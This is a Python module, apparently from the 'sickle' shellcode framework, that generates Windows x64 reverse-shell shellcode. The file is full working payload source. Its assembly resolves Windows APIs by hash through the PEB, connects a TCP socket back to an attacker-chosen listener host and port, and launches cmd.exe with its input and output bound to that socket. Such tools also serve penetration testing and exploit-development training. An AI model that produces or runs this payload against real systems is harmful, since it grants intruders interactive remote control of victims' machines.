import sys
import ctypes
import struct

from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.lib.generic.mparser import argument_check

from sickle.common.lib.generic.convert import port_str_to_htons
from sickle.common.lib.generic.convert import from_str_to_xwords
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import from_str_to_win_hash

from sickle.common.headers.windows.ntdef import _LIST_ENTRY
from sickle.common.headers.windows.ntdef import _UNICODE_STRING

from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS64
from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER64

from sickle.common.headers.windows.winternl import _PEB
from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY

from sickle.common.headers.windows.winsock2 import AF_INET
from sickle.common.headers.windows.winsock2 import sockaddr
from sickle.common.headers.windows.winsock2 import SOCK_STREAM
from sickle.common.headers.windows.winsock2 import IPPROTO_TCP

from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES

class Shellcode():

    arch = "x64"

    platform = "windows"

    name = f"Windows ({arch}) CMD Reverse Shell"

    module = f"{platform}/{arch}/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"

    ring = 3

    author = ["Morten Schenk",
              "Alexandru Uifalvi",
              "Matteo Memelli",
              "wetw0rk"]

    tested_platforms = ["Windows 10 (10.0.17763 N/A Build 17763)",
                        "Windows 11 (10.0.26100 N/A Build 26100)"]

    summary = ("TCP-based reverse shell over IPv4 that provides an interactive cmd.exe "
               "session")

    description = """
    A TCP-based reverse shell over IPv4 that provides an interactive cmd.exe
    session. Since this payload is not staged, there is no need for anything
    more than a Netcat listener.
    """

    arguments = {}
    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]
        arg_object["architecture"] = Shellcode.arch
        self.builder = Assembler(Shellcode.arch)

        self.dependencies = {
            "Kernel32.dll": [
                "CreateProcessA",
                "TerminateProcess",
                "LoadLibraryA",
            ],
            "Ws2_32.dll": [
                "WSAStartup",
                "WSASocketA",
                "connect",
            ],
        }

        self.storage_offsets = {
            # -------------- FUNCTIONS --------------
            "CreateProcessA"                : 0x090,
            "TerminateProcess"              : 0x088,
            "LoadLibraryA"                  : 0x080,
            "WSAStartup"                    : 0x098,
            "WSASocketA"                    : 0x0a0,
            "connect"                       : 0x0a8,
            # -------------- VARIABLES --------------
            "tmpFunctionBuffer"             : 0x100,
            "wsaData"                       : 0x200, 
            "name"                          : 0x220,
            "lpStartInfo"                   : 0x300,
        }

        return

    def get_kernel32(self):
        """Generates stub for obtaining the base address of Kernel32.dll
        """

        stub = f"""
; DWORD64 getKernel32()
; {{
;	 CHAR c = 'K';
;	 PPEB pPEB = (PPEB)__readgsqword(0x60);
;	 PPEB_LDR_DATA pLdrData = (PLDR_DATA_TABLE_ENTRY)pPEB->Ldr;
;	 DWORD64 pHeadEntry = ((DWORD64)((PLDR_DATA_TABLE_ENTRY)pPEB->Ldr->InInitializationOrderModuleList.Flink));
;
;	 PLIST_ENTRY pEntry = ((PLIST_ENTRY)pHeadEntry)->Flink;
;	 while (1) {{
;		 PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)((DWORD64)pEntry - 0x10);
;		 if (((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[0]) == c) && ((CHAR*)(pLdrDataTableEntry->FullDllName.Buffer[13]) == '\0')) {{
;			 return pLdrDataTableEntry->InInitializationOrderLinks.Flink;
;		 }}
;
;		 pEntry = pEntry->Flink;
;	 }}
; }}

getKernel32:
    mov dl, 0x4b
getPEB:
    mov rcx, 0x60
    mov r8, gs:[rcx]
getHeadEntry:
    mov rdi, [r8 + {_PEB.Ldr.offset}]
    mov rdi, [rdi + {_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
search:
    xor rcx, rcx
    mov rax, [rdi + {_LDR_DATA_TABLE_ENTRY.DllBase.offset}]
    mov rsi, [rdi + {_LDR_DATA_TABLE_ENTRY.BaseDllName.offset + _UNICODE_STRING.Buffer.offset}]
    mov rdi, [rdi]
    cmp [rsi + 0x18], cx
    jne search
    cmp [rsi], dl
    jne search
    ret
        """

        return stub

    def lookup_function(self):
        """Generates the stub responsible for obtaining the base address of a function
        """

        stub = f"""
; UINT hashAlgorithm(char* functionName)
; {{
;	 DWORD hash = 0x00;
;	 DWORD rorByte = 0x0D;
;	 for (int i = 0; i < (strlen(functionName)); i++)
;	 {{
;		 hash += (UINT16)functionName[i] & 0xFFFFFFFF;
;		 if (i < (strlen(functionName) - 1)) {{
;			 hash = ((hash >> rorByte) | (hash << (32 - rorByte))) & 0xFFFFFFFF;
;		 }}
;	 }}
;	 return hash;
; }}
;
; void lookupFunction(LPVOID moduleBase, UINT functionHash) {{
;	 PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
;	 PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dosHeader->e_lfanew);
;	 IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)moduleBase + ntHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
;	 DWORD* addressOfNames = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNames);
;	 DWORD numberOfNames = exportDirectory->NumberOfNames;
;
;	 DWORD i = numberOfNames;
;	 while (i-- != 0) {{
;		 char* functionNameFromModule = (char*)((BYTE*)moduleBase + addressOfNames[i]);
;		 if (hashAlgorithm(functionNameFromModule) == functionHash) {{
;			 DWORD* addressOfFunctions = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfFunctions);
;			 DWORD* addressOfNameOrdinals = (DWORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals);
;			 WORD ordinal = ((WORD*)((BYTE*)moduleBase + exportDirectory->AddressOfNameOrdinals))[i];
;			 return (LPVOID)((BYTE*)moduleBase + addressOfFunctions[ordinal]);
;		 }}
;	 }}
; }}

lookupFunction:
    mov ebx, [rdi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
    add rbx, {_IMAGE_NT_HEADERS64.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER64.DataDirectory.offset}
    add rbx, rdi
    mov eax, [rbx]
    mov rbx, rdi
    add rbx, rax
    mov eax, [rbx + {_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
    mov r8, rdi
    add r8, rax
    mov rcx, [rbx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
parseNames:
    jecxz error
    dec ecx
    mov eax, [r8 + rcx * 4]
    mov rsi, rdi
    add rsi, rax
    xor r9, r9
    xor rax, rax
    cld
calcHash:
    lodsb
    test al, al
    jz calcDone
    ror r9d, 0xD
    add r9, rax
    jmp calcHash
calcDone:
    cmp r9d, edx
    jnz parseNames
findAddress:
    mov r8d, [rbx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
    add r8, rdi
    xor rax, rax
    mov ax, [r8 + rcx * 2]
    mov r8d, [rbx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
    add r8, rdi
    mov eax, [r8 + rax * 4]
    add rax, rdi
found:

error:
    ret
        """

        return stub

    def load_library(self, lib):
        """Generates the stub to load a library not currently loaded into a process
        """

        lists = from_str_to_xwords(lib)
        write_index = self.storage_offsets['tmpFunctionBuffer']

        src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
        for i in range(len(lists["QWORD_LIST"])):
            src += "    mov rcx, 0x{}\n".format( struct.pack('<Q', lists["QWORD_LIST"][i]).hex() )
            src += "    mov [r15+{}], rcx\n".format(hex(write_index))
            write_index += 8

        for i in range(len(lists["DWORD_LIST"])):
            src += "    mov ecx, dword 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() ) 
            src += "    mov [r15+{}], ecx\n".format(hex(write_index))
            write_index += 4

        for i in range(len(lists["WORD_LIST"])):
            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
            src += "    mov [r15+{}], cx\n".format(hex(write_index))
            write_index += 2

        for i in range(len(lists["BYTE_LIST"])):
            src += "    mov cl, {}\n".format( hex(lists["BYTE_LIST"][i]) )
            src += "    mov [r15+{}], cl\n".format(hex(write_index))
            write_index += 1

        src += f"""
    lea rcx, [r15 + {self.storage_offsets['tmpFunctionBuffer']}]
    mov rax, [r15 + {self.storage_offsets['LoadLibraryA']}]
    call rax
        """

        return src

    def resolve_functions(self):
        """This function is responsible for loading all libraries and resolving respective functions
        """

        stub = ""
        for lib, imports in self.dependencies.items():
            if (lib != "Kernel32.dll"):
                stub += self.load_library(lib)
                stub += """
    mov rdi, rax
                """

            for func in range(len(imports)):
                stub += f"""
get_{imports[func]}:
    mov rdx, {from_str_to_win_hash(imports[func])}
    call lookupFunction
    mov [r15 + {self.storage_offsets[imports[func]]}], rax
                """

        return stub

    def generate_source(self):
        """Returns bytecode generated by the keystone engine.
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = int(argv_dict["LPORT"])


        shellcode = """
_start:
    call getKernel32
    mov rdi, rax

stackAlign:
    sub rsp, 8
    mov r15, rsp
"""

        shellcode += self.resolve_functions()
        
        shellcode += f"""
; RAX => WSAStartup([in]  WORD      wVersionRequired, // RCX => MAKEWORD(2, 2) 
;                   [out] LPWSADATA lpWSAData);       // RDX => &wsaData
call_WSAStartup:
    mov rcx, 0x202
    lea rdx, [r15 + {self.storage_offsets['wsaData']}]
    mov rax, [r15 + {self.storage_offsets['WSAStartup']}]
    call rax

; RAX => WSASocketA([in] int                 af,              // RCX      => AF_INET
;                   [in] int                 type,            // RDX      => SOCK_STREAM
;                   [in] int                 protocol,        // R8       => IPPROTO_TCP
;                   [in] LPWSAPROTOCOL_INFOA lpProtocolInfo,  // R9       => NULL
;                   [in] GROUP               g,               // RSP+0x20 => NULL
;                   [in] DWORD               dwFlags);        // RSP+0x28 => NULL
call_WSASocketA:
    mov ecx, {AF_INET}
    mov edx, {SOCK_STREAM}
    mov r8, {IPPROTO_TCP}
    xor r9, r9
    mov [rsp+0x20], r9
    mov [rsp+0x28], r9
    mov rax, [r15 + {self.storage_offsets['WSASocketA']}]
    call rax
    mov rsi, rax ; save the socket file descriptor (sockfd)

; RAX => connect([in] SOCKET s,             // RCX => sockfd (Obtained from WSASocketA)
;                [in] const sockaddr *name, // RDX => {{ IP | PORT | SIN_FAMILY }}
;                [in] int namelen);         // R8  => sizeof(sockaddr)
call_connect:
    mov rcx, rax
    mov r8, {ctypes.sizeof(sockaddr)}
    lea rdx, [r15 + {self.storage_offsets['name']}]
    mov r9, {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}{struct.pack('<H', lport).hex()}0002
    mov [rdx], r9
    xor r9, r9
    mov [rdx + 0x8], r9
    mov rax, [r15 + {self.storage_offsets['connect']}]
    call rax

; [RBX] => typedef struct _STARTUPINFOA {{ }}
setup_STARTUPINFOA:
    mov rdi, r15
    add rdi, {self.storage_offsets['lpStartInfo']}

    mov rbx, rdi  ; RDI = Destination ( memset(rdi, value, x) )
    xor eax, eax  ; EAX = 0x00 (value)
    mov ecx, 0x20 ; 0x20 * sizeof(DWORD) = (x -> 0x80)
    rep stosd     ; Zero out x bytes

    mov eax, {ctypes.sizeof(_STARTUPINFOA)} ; lpStartInfo.cb = sizeof(_STARTUPINFO)
    mov [rbx], eax

    mov eax, {STARTF_USESTDHANDLES}
    mov [rbx + {_STARTUPINFOA.dwFlags.offset}], eax
    mov [rbx + {_STARTUPINFOA.hStdInput.offset}], rsi
    mov [rbx + {_STARTUPINFOA.hStdOutput.offset}], rsi
    mov [rbx + {_STARTUPINFOA.hStdError.offset}], rsi

; RAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,     // RCX      => NULL
;                       [in, out, optional] LPSTR                 lpCommandLine,         // RDX      => "cmd"
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,   // R8       => NULL
;                       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,    // R9       => NULL
;                       [in]                BOOL                  bInheritHandles,       // RSP+0x20 => NULL
;                       [in]                DWORD                 dwCreationFlags,       // RSP+0x28 => 0x01 (DEBUG_PROCESS)
;                       [in, optional]      LPVOID                lpEnvironment,         // RSP+0x30 => NULL
;                       [in, optional]      LPCSTR                lpCurrentDirectory,    // RSP+0x38 => NULL
;                       [in]                LPSTARTUPINFOA        lpStartupInfo,         // RSP+0x40 => &lpStartupInfo
;                       [out]               LPPROCESS_INFORMATION lpProcessInformation); // RSP+0x48 => &lpStartupInfo ()
call_CreateProccessA:
    xor ecx, ecx                 ; lpApplicationName
    mov rdx, r15                 ; lpCommandLine
    add rdx, 0x180               ;
    mov eax, 0x646d63            ; "cmd"
    mov [rdx], rax
    xor r8, r8                   ; lpProcessAttributes
    xor r9, r9                   ; lpThreadAttributes
    xor eax, eax                 ;
    inc eax
    mov [rsp + 0x20], rax        ; bInheritHandles
    dec eax
    mov [rsp + 0x28], rax        ; dwCreationFlags
    mov [rsp + 0x30], rax        ; lpEnvironment
    mov [rsp + 0x38], rax        ; lpCurrentDirectory
    mov [rsp + 0x40], rbx        ; lpStartupInfo
    add rbx, 0x68
    mov [rsp + 0x48], rbx        ; lpProcessInformation
    mov rax, [r15 + {self.storage_offsets['CreateProcessA']}]
    call rax

; RAX => TerminateProcess([in] HANDLE hProcess,   // RCX => -1 (Current Process)
;                         [in] UINT   uExitCode); // RDX => 0x00 (Clean Exit)
call_TerminateProcess:
	xor rcx, rcx
	dec rcx
	xor rdx, rdx
	mov rax, [r15 + {self.storage_offsets['TerminateProcess']}]
	call rax
"""

        shellcode += self.get_kernel32()
        shellcode += self.lookup_function()

        return shellcode

    def get_shellcode(self):
        """Generates Windows (x64) generic reverse shell
        """

        return self.builder.get_bytes_from_asm(self.generate_source())
